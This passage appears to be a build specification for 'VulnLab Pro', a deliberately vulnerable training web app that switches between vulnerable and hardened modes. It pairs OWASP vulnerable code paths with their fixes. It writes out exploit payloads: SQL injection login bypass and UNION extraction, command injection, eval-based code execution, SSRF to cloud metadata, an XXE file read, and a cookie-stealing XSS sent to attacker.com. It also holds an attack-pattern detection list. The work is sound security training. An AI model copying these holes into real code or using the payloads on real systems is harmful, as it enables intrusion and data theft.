+       (red glow)                (green glow)
+It is an animated pill switch, not a checkbox.
+When mode changes, a toast notification appears on ALL connected clients
+saying "Security mode changed to [mode] by [admin_username]".
+5.4 What Changes Per Mode (Complete List)
+Authentication (authService.js)
+VULNERABLE mode:
+javascript// SQL injection possible — string concatenated directly
+const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+// No rate limiting
+// No lockout
+// Passwords may be stored as plaintext
+// JWT secret is "secret" (weak)
+// JWT has no expiry set
+// Session cookie has no HttpOnly, no Secure, no SameSite
+HARDENED mode:
+javascript// Parameterized query — injection impossible
+const query = `SELECT * FROM users WHERE username=?`;
+const [rows] = await db.execute(query, [username]);
+// Then compare bcrypt hash
+const valid = await bcrypt.compare(password, rows[0].password);
+// Rate limiting: 5 attempts per 15 minutes
+// Lockout: is_locked = true after 5 failures
+// JWT secret from process.env.JWT_SECRET (strong)
+// JWT expires in 1 hour
+// Cookie: HttpOnly=true, Secure=true, SameSite=Strict
+Input Handling (middleware/inputSanitizer.js)
+VULNERABLE mode:
+javascript// Do nothing — pass all input through raw
+module.exports = (req, res, next) => next();
+HARDENED mode:
+javascript// Strip HTML tags, escape special chars
+// Validate email format, URL format, etc.
+// Apply DOMPurify-style server-side sanitization
+File Uploads (uploadService.js)
+VULNERABLE mode:
+
+Accept ANY file extension (including .php, .jsp, .exe, .sh, .py)
+Accept ANY MIME type
+No file size limit
+Store files with ORIGINAL filename (path traversal possible: ../../etc/passwd)
+Serve uploaded files from accessible URL without auth
+
+HARDENED mode:
+
+Allowlist: only .jpg, .jpeg, .png, .gif, .pdf, .txt, .doc, .docx
+Validate actual MIME type via magic bytes (not just Content-Type header)
+Max file size: 5MB
+Rename to UUID + extension (prevent path traversal)
+Serve uploaded files via authenticated endpoint only
+
+Error Responses
+VULNERABLE mode:
+json{
+  "error": "ER_NO_SUCH_TABLE: Table 'vulnlab.userz' doesn't exist",
+  "stack": "Error\n    at /app/routes/auth.js:45:12\n    at Layer.handle...",
+  "query": "SELECT * FROM userz WHERE..."
+}
+HARDENED mode:
+json{ "error": "An internal error occurred. Please try again." }
+HTTP Headers
+VULNERABLE mode (returns these bad headers):
+
+X-Powered-By: Express
+No X-Frame-Options (clickjacking possible)
+No Content-Security-Policy
+Access-Control-Allow-Origin: * (CORS wide open, with credentials)
+No X-Content-Type-Options
+
+HARDENED mode (adds via Helmet):
+
+Removes X-Powered-By
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+Access-Control-Allow-Origin: http://localhost:3000 (specific)
+X-Content-Type-Options: nosniff
+Strict-Transport-Security: max-age=31536000
+
+GraphQL
+VULNERABLE mode:
+
+Introspection: ENABLED (full schema exposed)
+Depth limiting: NONE (allows deeply nested queries → DoS)
+Query complexity: UNLIMITED
+Field-level auth: NONE (any user can call any resolver)
+Batch queries: ENABLED (multiple operations in one request)
+
+HARDENED mode:
+
+Introspection: DISABLED
+Max query depth: 5
+Max complexity: 100
+Every resolver checks authorization
+Batch queries: DISABLED
+
+Session/Cookie
+VULNERABLE mode:
+javascriptapp.use(session({
+  secret: 'mysecret',
+  resave: true,
+  saveUninitialized: true,
+  cookie: {
+    httpOnly: false,   // accessible via JS (XSS can steal)
+    secure: false,
+    sameSite: false,
+    maxAge: 30 * 24 * 60 * 60 * 1000  // 30 days
+  }
+}));
+HARDENED mode:
+javascriptapp.use(session({
+  secret: process.env.SESSION_SECRET,
+  resave: false,
+  saveUninitialized: false,
+  cookie: {
+    httpOnly: true,
+    secure: process.env.NODE_ENV === 'production',
+    sameSite: 'strict',
+    maxAge: 60 * 60 * 1000  // 1 hour
+  }
+}));
+
+═══════════════════════════════════════════════════════════════
+PART 6 — OWASP TOP 10: FULL IMPLEMENTATION SPECIFICATION
+═══════════════════════════════════════════════════════════════
+For EVERY vulnerability below, implement:
+
+A real, genuinely exploitable vulnerable code path
+A properly mitigated hardened code path
+A comment tag: // [VULN-A0X] Vulnerability name above vulnerable blocks
+A comment tag: // [FIX-A0X] Fix description above hardened blocks
+An entry in docs/VULNERABILITIES.md with step-by-step exploit instructions
+
+
+A01 — Broken Access Control
+IDOR on User Profiles
+
+Endpoint: GET /api/users/:id
+VULNERABLE: Returns FULL user object including password_plain, ssn, secret_note, balance, last_ip for ANY user ID — zero ownership check
+HARDENED: Returns only public fields (username, avatar_url, bio) for other users; full data only for own profile or admin
+Exploit: Log in as alice (id=3), then fetch /api/users/1 → get admin's SSN and password
+
+IDOR on Transactions
+
+Endpoint: GET /api/transactions/:id
+VULNERABLE: Any user can view any transaction by ID
+HARDENED: Only sender, receiver, or admin can view a transaction
+
+Privilege Escalation via Mass Assignment
+
+Endpoint: PUT /api/users/:id
+VULNERABLE: Updates user from req.body directly including role field → any user can set role: "admin"
+HARDENED: Explicitly allowlist updatable fields: ['full_name', 'bio', 'phone', 'address', 'avatar_url']
+
+Missing Admin Panel Auth (Backend)
+
+Route: /api/admin/*
+VULNERABLE: Only checked via frontend route guard; backend middleware skipped
+HARDENED: Backend middleware verifies JWT AND role is admin or sudo on every /api/admin route
+
+Accessing Private Channels
+
+VULNERABLE: GET /api/channels/:id/messages — no membership check
+HARDENED: Verify channel_members table contains requester's user_id
+
+IDOR on Orders
+
+Endpoint: GET /api/orders/:id
+VULNERABLE: Any authenticated user can view any order
+HARDENED: Only order owner or admin
+
+
+A02 — Cryptographic Failures
+Plaintext Password Storage
+
+VULNERABLE: INSERT INTO users SET password='${req.body.password}' — literal plaintext
+HARDENED: const hash = await bcrypt.hash(password, 12); INSERT ... SET password='${hash}'
+
+Weak JWT Secret
+
+VULNERABLE: jwt.sign(payload, 'secret') — the word "secret" as the JWT secret
+HARDENED: jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '1h' }) where JWT_SECRET is 64+ random bytes
+
+JWT in LocalStorage (XSS risk)
+
+VULNERABLE: Frontend stores JWT in localStorage — accessible to any JavaScript
+HARDENED: JWT stored only in HttpOnly cookie — not accessible to JS
+
+Sensitive Data in API Responses
+
+VULNERABLE: Every user query returns full object including password_plain, ssn, balance, secret_note
+HARDENED: GraphQL schema explicitly excludes these fields from non-admin queries
+
+Sensitive Data in Logs
+
+VULNERABLE: requestLogger.js logs full request_body including passwords:
+{"username":"alice","password":"password"} appears in app.log
+HARDENED: Redact password, token, cvv, ssn fields before logging:
+{"username":"alice","password":"[REDACTED]"}
+
+HTTP Cookie Without Flags
+
+VULNERABLE: Set-Cookie: session=abc123 — no HttpOnly, no Secure, no SameSite
+HARDENED: Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
+
+
+A03 — Injection
+SQL Injection — Login Bypass
+
+Endpoint: POST /api/auth/login
+VULNERABLE code:
+
+javascript  // [VULN-A03] String concatenation enables SQL injection
+  const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+
+Exploit payload: username = ' OR '1'='1' -- , password = anything
+This returns the first user (admin) and logs them in without knowing the password
+HARDENED code:
+
+javascript  // [FIX-A03] Parameterized query prevents injection
+  const [rows] = await db.execute(`SELECT * FROM users WHERE username=?`, [username]);
+SQL Injection — Product Search
+
+Endpoint: GET /api/products?search=<input>
+VULNERABLE: SELECT * FROM products WHERE name LIKE '%${query}%' OR description LIKE '%${query}%'
+Exploit: search=test' UNION SELECT id,username,password_plain,email,ssn,6,7,8,9,10,11,12 FROM users -- 
+HARDENED: Parameterized LIKE query
+
+SQL Injection — Message Search
+
+Endpoint: GET /api/messages/search?q=<input>
+VULNERABLE: String concatenation in WHERE clause
+Exploit: Similar UNION-based data extraction
+
+GraphQL Injection
+
+VULNERABLE: GraphQL variables inserted into raw SQL inside resolvers
+Exploit: Inject SQL via GraphQL variable values
+HARDENED: All GraphQL resolvers use parameterized queries
+
+OS Command Injection
+
+Endpoint: GET /api/debug/ping?host=<input> (debug endpoint, only in vulnerable mode)
+VULNERABLE:
+
+javascript  // [VULN-A03] Command injection via unvalidated host parameter
+  const { exec } = require('child_process');
+  exec(`ping -c 1 ${req.query.host}`, callback);
+
+Exploit: host=127.0.0.1; cat /etc/passwd
+HARDENED: This endpoint does not exist in hardened mode (removed entirely)
+
+Server-Side Template Injection (SSTI) hint
+
+The product description field rendered via a template in the admin preview
+VULNERABLE: Direct string interpolation eval() of template
+HARDENED: Static rendering only
+
+
+A04 — Insecure Design
+Negative Transfer Amount
+
+Endpoint: POST /api/transactions/transfer
+VULNERABLE: No validation on amount field → sending amount: -500 effectively
+RECEIVES $500 from the target user (logic flaw)
+Exploit: { "to": "admin", "amount": -1000 } → your balance increases by $1000
+HARDENED: if (amount <= 0) throw new Error('Amount must be positive')
+
+Password Reset via Guessable Security Question
+
+Endpoint: POST /api/auth/forgot-password
+VULNERABLE: Asks for username + mother's maiden name; answers seeded in DB; answer is trivially guessable
+HARDENED: Email-based token sent to registered email, token expires in 15 minutes
+
+Username Enumeration
+
+VULNERABLE: Login returns "User not found" vs "Wrong password" — tells attacker whether username exists
+HARDENED: Always returns "Invalid credentials" for any auth failure
+
+No Brute-Force Protection
+
+VULNERABLE: Can attempt login thousands of times per second
+HARDENED: express-rate-limit: 5 attempts per 15 minutes per IP
+
+Predictable Order IDs
+
+VULNERABLE: Order IDs are sequential integers (1, 2, 3...) — enables IDOR enumeration
+HARDENED: Order references use UUID or ULID
+
+
+A05 — Security Misconfiguration
+Verbose Error Messages with Stack Traces
+
+VULNERABLE: Express error handler returns full stack trace to client
+Exploit: Trigger an error → learn file paths, library versions, DB structure
+HARDENED: Generic message; stack only in server logs
+
+Directory Listing
+
+VULNERABLE: express.static('uploads') with no index file → browser can list all uploaded files
+Exploit: Visit /uploads/ to see all uploaded files
+HARDENED: Files served only via authenticated endpoint /api/files/:id
+
+Debug Endpoints Active
+
+VULNERABLE: /api/debug/ping, /api/debug/eval, /api/debug/env exist and return env vars
+HARDENED: These routes registered only when NODE_ENV=development
+
+Wide-Open CORS
+
+VULNERABLE: app.use(cors({ origin: '*', credentials: true })) — any website can make credentialed requests
+HARDENED: cors({ origin: process.env.FRONTEND_URL, credentials: true })
+
+Default/Weak Database Credentials
+
+VULNERABLE: docker-compose uses root:root for MySQL
+Hardened profile: uses strong random credentials from .env
+
+PhpMyAdmin Without Auth Restriction
+
+VULNERABLE: PhpMyAdmin on port 8080 accessible to anyone on the network
+Hardened: PhpMyAdmin bound to 127.0.0.1 only
+
+Package Version Disclosure
+
+VULNERABLE: GET /api/debug/version returns full package.json including all dependency versions
+Exploit: Identify vulnerable package versions to exploit
+HARDENED: Endpoint removed; or returns only app name and major version
+
+
+A06 — Vulnerable and Outdated Components
+Implementation
+
+In package.json, intentionally include these outdated vulnerable packages:
+
+lodash@4.17.4 (prototype pollution vulnerability — CVE-2019-10744)
+express@4.17.1 (older version with known issues)
+jsonwebtoken@8.5.1 (older version)
+
+
+Run npm audit and document the output in docs/VULNERABILITIES.md
+Endpoint GET /api/debug/version exposes all package versions in vulnerable mode
+In hardened mode: update all packages to latest; remove version disclosure endpoint
+Document in VULNERABILITIES.md: how to exploit prototype pollution via lodash
+
+
+A07 — Identification and Authentication Failures
+Weak Password Policy
+
+VULNERABLE: Registration accepts password=1 (single character)
+HARDENED: Minimum 8 chars, 1 uppercase, 1 number, 1 special character enforced
+
+No Account Lockout
+
+VULNERABLE: Can brute force login with no limit
+HARDENED: 5 failed logins → is_locked=true → locked for 15 minutes
+
+JWT Without Expiry
+
+VULNERABLE: jwt.sign({ id: user.id }, 'secret') — no expiresIn → token valid forever
+HARDENED: jwt.sign({...}, secret, { expiresIn: '1h' })
+
+Insecure "Remember Me"
+
+VULNERABLE: Remember me stores username:password as Base64 in localStorage
+HARDENED: Remember me issues a separate long-lived refresh token stored in HttpOnly cookie
+
+Session Fixation
+
+VULNERABLE: Session ID NOT regenerated after login — attacker can fixate session
+HARDENED: req.session.regenerate() called immediately after successful login
+
+Concurrent Session Allowed
+
+VULNERABLE: Same user can log in from unlimited devices with no notification
+HARDENED: New login invalidates previous sessions (stored in DB)
+
+
+A08 — Software and Data Integrity Failures
+Unsafe File Upload (Executable Upload)
+
+VULNERABLE: Multer accepts any file type. Attacker uploads shell.php.jpg or just shell.php
+Stored as uploaded. If served from a PHP-capable path, executes as PHP.
+Even without PHP execution, stored path is revealed to attacker.
+HARDENED: Magic byte validation, extension allowlist, UUID rename
+
+Mass Assignment (Role Escalation)
+
+VULNERABLE: await db.query('UPDATE users SET ? WHERE id=?', [req.body, userId])
+Attacker includes role: "admin" in body → becomes admin
+HARDENED:
+
+javascript  const allowed = ['full_name','bio','phone','address'];
+  const update = {};
+  allowed.forEach(k => { if (req.body[k]) update[k] = req.body[k]; });
+Admin Import with eval()
+
+Endpoint: POST /api/admin/import-users
+VULNERABLE: Accepts JSON with a transform field and runs eval(transform) on the data
+Exploit: { "transform": "process.mainModule.require('child_process').execSync('id')" }
+HARDENED: Remove eval; use strict schema validation with JSON Schema
+
+Insecure Deserialization
+
+VULNERABLE: A cookie value decoded with JSON.parse without validation, allowing property injection
+HARDENED: Use signed cookies; validate all parsed data against known schema
+
+
+A09 — Security Logging and Monitoring Failures
+What MUST be logged at ALL times (both modes):
+Every single one of these events must be written to BOTH logs/app-YYYY-MM-DD.log
+AND the request_logs / security_events MySQL tables:
+
+Every HTTP request: method, path, user_id, username, IP, user_agent, status, duration
+Every GraphQL operation: operation name, variables (redacted in hardened), user_id, result
+Every authentication attempt: username tried, success or fail, IP, timestamp
+Every failed authentication: flag as security event, severity=high
+Every admin action: who, what action, on which target, old value, new value
+Every file upload: uploader, original name, type, size, stored path
+Every balance transfer: sender, receiver, amount, before/after balances
+Every security mode change: who changed it, from/to, timestamp
+Suspicious inputs detected: ' OR, UNION SELECT, <script>, ../, http:// in unusual fields
+Every password reset request: username, IP, whether token was sent
+
+Vulnerable Mode Logging Failures (intentionally bad):
+
+Auth failures are NOT logged
+Balance transfers are NOT logged to security_events
+Log file is chmod 777 (world-writable — any user can tamper)
+No alerting on 5+ failed logins from same IP
+Logs include passwords in plaintext
+
+Hardened Mode Logging Fixes:
+
+All above events logged with severity rating
+Passwords/tokens REDACTED before logging
+Log file is chmod 640 (readable only by app user)
+After 5 auth failures from same IP in 5 minutes → flag in security_events as brute_force_attempt
+Admin can view logs via /admin/logs page (paginated, searchable)
+Admin can download full log file via GET /api/admin/logs/download
+
+
+A10 — Server-Side Request Forgery (SSRF)
+Product Image Fetch
+
+Endpoint: POST /api/products/fetch-image
+Body: { "imageUrl": "https://example.com/image.jpg" }
+VULNERABLE: Fetches the URL server-side using axios.get(req.body.imageUrl) with NO validation
+Exploits:
+
+imageUrl: "http://127.0.0.1:3306" → scan internal ports
+imageUrl: "http://169.254.169.254/latest/meta-data/" → AWS metadata
+imageUrl: "file:///etc/passwd" → local file read (if axios allows)
+imageUrl: "http://internal-service:8080/admin" → pivot to internal network
+
+
+HARDENED:
+
+Allowlist of permitted domains (e.g., only imgur.com, cloudinary.com)
+Block all private IP ranges: 127.x.x.x, 10.x.x.x, 172.16-31.x.x, 192.168.x.x, 169.254.x.x
+Block file:// protocol
+Response: save image locally, return internal URL; never proxy response to client
+
+
+
+Webhook Test Endpoint
+
+Endpoint: POST /api/webhooks/test
+Body: { "url": "https://myserver.com/callback", "payload": {} }
+VULNERABLE: POSTs the payload to any URL with no validation
+Exploit: Set URL to Burp Collaborator or internal service
+HARDENED: URL must match user's registered webhook URL; domain allowlisted
+
+Open Redirect
+
+Endpoint: GET /api/redirect?url=https://evil.com
+VULNERABLE: res.redirect(req.query.url) with no validation
+Exploit: Use in phishing: https://vulnlab.local/api/redirect?url=https://evil.com
+HARDENED: Allowlist of valid redirect paths; only relative URLs permitted
+
+
+═══════════════════════════════════════════════════════════════
+PART 7 — ADDITIONAL VULNERABILITIES (BEYOND OWASP TOP 10)
+═══════════════════════════════════════════════════════════════
+These must also be implemented with the same dual-mode approach.
+XSS — Stored (Persistent)
+
+Location: Channel messages, social post content, product descriptions, comments
+VULNERABLE: Content stored raw in DB, rendered via dangerouslySetInnerHTML in React
+Exploit: Send message <script>document.location='http://attacker.com?c='+document.cookie</script>
+→ Executes in every user's browser who views the channel
+HARDENED: Server-side strip HTML tags; React renders as text (default — remove dangerouslySetInnerHTML)
+
+XSS — Reflected
+
+Location: Search endpoint GET /api/products?search=<input>, error messages
+VULNERABLE: Search term reflected in response HTML without encoding
+Exploit: search=<img src=x onerror=alert(1)> → executes in browser
+HARDENED: HTML-encode all reflected user input
+
+CSRF
+
+Location: Balance transfer form, profile update, password change
+VULNERABLE: No CSRF token in forms; no SameSite cookie attribute
+Exploit: Attacker hosts <form action="http://vulnlab.local/api/transactions/transfer" method="POST">...
+with hidden fields → victim visits page → transfer executed automatically
+HARDENED: Generate CSRF token per session; validate on every state-changing request
+Use csurf middleware or manual double-submit cookie pattern
+
+Insecure Direct Object References (IDOR) — Files
+
+Location: GET /api/uploads/:filename
+VULNERABLE: Any user can access any uploaded file by guessing filename
+HARDENED: Serve files via database record lookup; verify ownership
+
+JWT Algorithm Confusion
+
+VULNERABLE: JWT verification accepts alg: none (no signature required)
+Exploit: Craft JWT with alg: none and any payload → accepted as valid
+HARDENED: Explicitly specify algorithm in jwt.verify(token, secret, { algorithms: ['HS256'] })
+
+Path Traversal
+
+Location: File download endpoint
+VULNERABLE: GET /api/files/download?name=../../etc/passwd
+Server does fs.readFile(path.join('uploads', req.query.name))
+Exploit: Read arbitrary files on server
+HARDENED: path.basename() to strip traversal sequences; validate file exists in uploads dir
+
+LFI / File Inclusion
+
+Location: Admin template preview endpoint
+VULNERABLE: GET /api/admin/preview?template=../../etc/hosts
+HARDENED: Strict allowlist of template names; no user-controlled path components
+
+Clickjacking
+
+VULNERABLE: No X-Frame-Options header → VulnLab Pro can be embedded in iframe
+Exploit: Embed login/transfer page in invisible iframe → click-jacking attack
+HARDENED: X-Frame-Options: DENY header via Helmet
+
+CORS Misconfiguration (with Credentials)
+
+VULNERABLE: Access-Control-Allow-Origin: * AND Access-Control-Allow-Credentials: true
+(This is invalid by spec but some servers allow it improperly)
+More practically: CORS set to reflect any Origin header value with credentials
+Exploit: Attacker's site at evil.com makes credentialed requests to vulnlab.local; reads responses
+HARDENED: CORS origin is a static allowlist from environment variable
+
+XXE (XML External Entity)
+
+Location: POST /api/admin/import accepts XML format
+VULNERABLE:
+
+javascript  // [VULN-XXE] External entity processing enabled
+  const parser = new xml2js.Parser({ explicitArray: false, allowBeforeBom: true });
+  // No XXE protection
+Exploit payload:
+xml  <?xml version="1.0"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+  <users><user>&xxe;</user></users>
+
+HARDENED: Disable external entity processing; use JSON import instead
+
+Race Condition
+
+Location: Balance transfer endpoint
+VULNERABLE: Read balance → check sufficient funds → deduct → write (non-atomic)
+Two simultaneous requests can both pass the check before either deducts
+Exploit: Send 10 concurrent transfer requests; each reads original balance; multiple succeed
+HARDENED: Use MySQL transaction with SELECT FOR UPDATE to lock the row during transfer
+
+GraphQL Introspection Abuse
+
+VULNERABLE: Introspection fully enabled → attacker maps entire schema
+Exploit: { __schema { types { name fields { name } } } } reveals all types, fields, mutations
+HARDENED: Disable introspection in production/hardened mode
+
+GraphQL Batch Attack / Brute Force
+
+VULNERABLE: Multiple operations in single request; no complexity limit
+Exploit: Send 1000 login mutations in one request to brute-force passwords
+HARDENED: Disable batching; add query complexity limits
+
+
+═══════════════════════════════════════════════════════════════
+PART 8 — GRAPHQL SCHEMA SPECIFICATION
+═══════════════════════════════════════════════════════════════
+Define ALL of these in backend/graphql/typeDefs/.
+graphql# ── User Types ──────────────────────────────────────────────
+type User {
+  id: ID!
+  username: String!
+  email: String          # hidden from non-self/non-admin in hardened
+  full_name: String
+  avatar_url: String
+  bio: String
+  role: String
+  balance: Float         # hidden from non-self/non-admin in hardened
+  ssn: String            # only visible to admin and in vuln mode IDOR
+  secret_note: String    # only visible to admin and in vuln mode IDOR
+  password_plain: String # only visible in vuln mode IDOR
+  is_active: Boolean
+  last_login: String
+  created_at: String
+  posts: [Post]
+  followers_count: Int
+  following_count: Int
+}
+
+type AuthPayload {
+  token: String!
+  user: User!
+  expiresIn: Int
+}
+
+# ── Product Types ────────────────────────────────────────────
+type Product {
+  id: ID!
+  name: String!
+  description: String
+  price: Float!
+  original_price: Float
+  stock: Int
+  category: String
+  brand: String
+  image_url: String
+  seller: User
+  is_active: Boolean
+  rating: Float
+  created_at: String
+}
+
+type Order {
+  id: ID!
+  buyer: User
+  items: [OrderItem]
+  total: Float
+  status: String
+  created_at: String
+}
+
+type OrderItem {
+  id: ID!
+  product: Product
+  quantity: Int
+  price_at_purchase: Float
+}
+
+# ── Channel Types ────────────────────────────────────────────
+type Channel {
+  id: ID!
+  name: String!
+  slug: String!
+  description: String
+  is_private: Boolean
+  created_by: User
+  members: [User]
+  messages(limit: Int, offset: Int): [Message]
+  message_count: Int
+  created_at: String
+}
+
+type Message {
+  id: ID!
+  channel: Channel
+  sender: User
+  content: String
+  file_url: String
+  reply_to: Message
+  is_deleted: Boolean
+  created_at: String
+}
+
+# ── Transaction Types ────────────────────────────────────────
+type Transaction {
+  id: ID!
+  sender: User
+  receiver: User
+  amount: Float
+  type: String
+  status: String
+  note: String
+  reference: String
+  created_at: String
+}
+
+# ── Post Types ───────────────────────────────────────────────
+type Post {
+  id: ID!
+  author: User
+  content: String
+  image_url: String
+  like_count: Int
+  comment_count: Int
+  liked_by_me: Boolean
+  comments: [Comment]
+  created_at: String
+}
+
+type Comment {
+  id: ID!
+  post: Post
+  author: User
+  content: String
+  created_at: String
+}
+
+# ── Log Types (Admin) ────────────────────────────────────────
+type RequestLog {
+  id: ID!
+  timestamp: String
+  method: String
+  path: String
+  user_id: Int
+  username: String
+  ip_address: String
+  status_code: Int
+  duration_ms: Int
+  is_suspicious: Boolean
+}
+
+# ── Root Types ───────────────────────────────────────────────
+type Query {
+  # Users
+  me: User
+  user(id: ID!): User               # IDOR in vulnerable mode
+  users(limit: Int, offset: Int): [User]  # All users — admin in hardened
+  searchUsers(query: String!): [User]
+
+  # Products
+  products(search: String, category: String, limit: Int, offset: Int): [Product]
+  product(id: ID!): Product
+  myProducts: [Product]
+
+  # Channels
+  channels: [Channel]
+  channel(id: ID!): Channel
+  myChannels: [Channel]
+
+  # Messages
+  messages(channelId: ID!, limit: Int, offset: Int): [Message]
+  searchMessages(channelId: ID!, query: String!): [Message]
+
+  # Orders
+  myOrders: [Order]
+  order(id: ID!): Order             # IDOR in vulnerable mode
+  allOrders: [Order]                # Admin only (improperly checked in vuln mode)
+
+  # Transactions
+  myTransactions: [Transaction]
+  transaction(id: ID!): Transaction  # IDOR in vulnerable mode
+  userTransactions(userId: ID!): [Transaction]  # Admin only check
+
+  # Social
+  feed(limit: Int, offset: Int): [Post]
+  post(id: ID!): Post
+  myPosts: [Post]
+
+  # Admin
+  allUsers: [User]
+  requestLogs(limit: Int, offset: Int): [RequestLog]
+  securityEvents(limit: Int, offset: Int): [RequestLog]
+  appSettings: AppSettings
+}
+
+type Mutation {
+  # Auth
+  register(username: String!, email: String!, password: String!): AuthPayload
+  login(username: String!, password: String!): AuthPayload
+  logout: Boolean
+  forgotPassword(email: String!): Boolean
+  resetPassword(token: String!, newPassword: String!): Boolean
+  updatePassword(currentPassword: String!, newPassword: String!): Boolean
+
+  # User
+  updateProfile(full_name: String, bio: String, phone: String, address: String): User
+  updateAvatar(avatarUrl: String!): User
+  deleteAccount(password: String!): Boolean
+  followUser(userId: ID!): Boolean
+  unfollowUser(userId: ID!): Boolean
+
+  # Products
+  createProduct(name: String!, description: String, price: Float!, stock: Int, category: String, imageUrl: String): Product
+  updateProduct(id: ID!, name: String, description: String, price: Float, stock: Int, category: String, imageUrl: String): Product
+  deleteProduct(id: ID!): Boolean
+
+  # Cart & Orders
+  addToCart(productId: ID!, quantity: Int): Boolean
+  removeFromCart(productId: ID!): Boolean
+  updateCartQuantity(productId: ID!, quantity: Int!): Boolean
+  checkout(shippingAddr: String): Order
+
+  # Channels
+  createChannel(name: String!, description: String, isPrivate: Boolean): Channel
+  deleteChannel(id: ID!): Boolean
+  joinChannel(channelId: ID!): Boolean
+  leaveChannel(channelId: ID!): Boolean
+  sendMessage(channelId: ID!, content: String!, fileUrl: String): Message
+  deleteMessage(id: ID!): Boolean
+  sendDirectMessage(receiverId: ID!, content: String!): Boolean
+
+  # Transactions
+  transfer(toUsername: String!, amount: Float!, note: String): Transaction
+
+  # Social
+  createPost(content: String!, imageUrl: String): Post
+  deletePost(id: ID!): Boolean
+  likePost(id: ID!): Boolean
+  addComment(postId: ID!, content: String!): Comment
+
+  # Admin
+  updateSecurityMode(mode: String!): Boolean
+  adminUpdateBalance(userId: ID!, delta: Float!, note: String): Boolean
+  adminUpdateUserRole(userId: ID!, role: String!): Boolean
+  adminDeleteUser(userId: ID!): Boolean
+  adminLockUser(userId: ID!): Boolean
+  adminUnlockUser(userId: ID!): Boolean
+  adminCreateProduct(name: String!, description: String, price: Float!, stock: Int!, category: String!, imageUrl: String, sellerId: ID): Product
+}
+
+type Subscription {
+  messageSent(channelId: ID!): Message
+  notificationReceived: Notification
+  securityModeChanged: String
+}
+
+type AppSettings {
+  security_mode: String
+  app_name: String
+  allow_register: Boolean
+}
+
+type Notification {
+  id: ID!
+  type: String
+  message: String
+  link: String
+  created_at: String
+}
+
+═══════════════════════════════════════════════════════════════
+PART 9 — LOGGING SYSTEM: COMPLETE SPECIFICATION
+═══════════════════════════════════════════════════════════════
+9.1 Winston Configuration (backend/utils/logger.js)
+javascriptconst winston = require('winston');
+require('winston-daily-rotate-file');
+
+// Custom format adds security mode to every log entry
+const addSecurityMode = winston.format((info) => {
+  // Security mode is attached by middleware; pass through
+  return info;
+})();
+
+const logger = winston.createLogger({
+  level: process.env.LOG_LEVEL || 'debug',
+  format: winston.format.combine(
+    winston.format.timestamp({ format: 'YYYY-MM-DDTHH:mm:ss.SSSZ' }),
+    winston.format.errors({ stack: true }),
+    winston.format.json()
+  ),
+  transports: [
+    // Main application log — rotates daily, keeps 30 days
+    new winston.transports.DailyRotateFile({
+      filename: 'logs/app-%DATE%.log',
+      datePattern: 'YYYY-MM-DD',
+      maxFiles: '30d',
+      zippedArchive: true,
+      level: 'debug'
+    }),
+    // Security-specific log — only warnings and above
+    new winston.transports.DailyRotateFile({
+      filename: 'logs/security-%DATE%.log',
+      datePattern: 'YYYY-MM-DD',
+      maxFiles: '90d',
+      zippedArchive: true,
+      level: 'warn'
+    }),
+    // Console output for development
+    new winston.transports.Console({
+      format: winston.format.combine(
+        winston.format.colorize(),
+        winston.format.printf(({ timestamp, level, message, ...meta }) =>
+          `${timestamp} [${level}] ${message} ${Object.keys(meta).length ? JSON.stringify(meta) : ''}`
+        )
+      )
+    })
+  ]
+});
+
+module.exports = logger;
+9.2 Request Logger Middleware (backend/middleware/requestLogger.js)
+This middleware runs on EVERY single request. It:
+
+Records the start time
+Captures request details
+After response finishes, logs to Winston AND inserts into request_logs table
+In vulnerable mode: logs full request_body including passwords
+In hardened mode: redacts sensitive fields
+
+javascript// Fields to redact in hardened mode
+const SENSITIVE_FIELDS = ['password', 'token', 'secret', 'cvv', 'ssn',
+                          'credit_card', 'authorization', 'cookie'];
+
+function redactSensitive(obj) {
+  // Deep-clone and replace sensitive field values with '[REDACTED]'
+  // ...implementation
+}
+
+// Heuristics for suspicious input detection
+function isSuspicious(body, query) {
+  const combined = JSON.stringify({ body, query }).toLowerCase();
+  const patterns = [
+    "' or ", "union select", "1=1", "--", "/*", "*/",
+    "<script>", "javascript:", "../", "file://",
+    "http://127.", "http://192.168.", "http://10.",
+    "whoami", "cat /etc", "/bin/sh", "eval(",
+    "base64_decode", "system("
+  ];
+  return patterns.some(p => combined.includes(p));
+}
+Log entry format (JSON Lines):
+json{
+  "timestamp": "2024-01-15T10:30:00.000Z",
+  "level": "info",
+  "type": "http_request",
+  "method": "POST",
+  "path": "/graphql",
+  "query_string": "",
+  "operation_name": "login",
+  "user_id": null,
+  "username": null,
+  "ip": "192.168.1.100",
+  "user_agent": "Mozilla/5.0 (X11; Linux x86_64)...",
+  "status_code": 200,
+  "duration_ms": 45,
+  "security_mode": "vulnerable",
+  "request_body": "{\"username\":\"admin\",\"password\":\"Admin@123\"}",
+  "response_size_bytes": 312,
+  "is_suspicious": false
+}
+9.3 Special Log Events
+These must be logged with their own type field:
+Event TypeLevelWhenKey Fieldsauth_attemptinfoEvery login tryusername, success, ip, user_agentauth_failurewarnFailed loginusername, reason, ip, attempt_countauth_successinfoSuccessful loginuser_id, username, role, ipauth_lockoutwarnAccount lockedusername, ip, failed_countadmin_actionwarnAny admin operationadmin_id, action, target, old_val, new_valmode_changewarnSecurity togglechanged_by, old_mode, new_modetransferinfoBalance transfersender_id, receiver_id, amount, balance_before, balance_afterfile_uploadinfoFile uploadeduploader_id, original_name, mime_type, size, stored_assuspicious_inputwarnHeuristic matchpattern_matched, endpoint, ip, user_idsqli_attempterrorSQL injection patternpayload, endpoint, ip, user_idxss_attempterrorXSS patternpayload, endpoint, ip, user_idssrf_attempterrorSSRF detectedurl_attempted, endpoint, ip, user_idrate_limit_hitwarnRate limit exceededip, endpoint, countpassword_resetinfoReset requestedemail_tried, token_sent, ip
+
+═══════════════════════════════════════════════════════════════
+PART 10 — UI DESIGN SPECIFICATIONS
+═══════════════════════════════════════════════════════════════
+10.1 Design Philosophy
+The UI must look like a professional internal enterprise tool — not a toy.
+Think: GitHub Dark + Linear.app + Slack sidebar aesthetic.
+Clean, dark, minimal. Every element serves a purpose.
+Backend correctness is paramount; UI is professional but not over-engineered.
+10.2 Color System (CSS Variables — backend/styles/variables.css)
+css:root {
+  /* Backgrounds */
+  --bg-base:        #0d1117;   /* Page background */
